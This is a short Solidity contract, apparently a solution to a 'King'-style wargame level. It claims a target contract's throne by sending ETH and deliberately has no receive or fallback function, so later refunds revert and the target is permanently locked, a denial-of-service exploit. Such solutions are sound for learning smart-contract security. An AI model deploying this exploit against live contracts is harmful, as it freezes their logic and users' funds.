// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

//用合约去调用目标合约的 receive()，但目标合约准备返 ETH 给本合约时会失败 revert
//因为本合约并未实现 fallback() 或者 receive()。
contract Exploit {
    function newKing(address  _target) payable public returns(bool){
        (bool status,) = address(_target).call{value : 0.00111 ether }("");
        return status;
    }
}
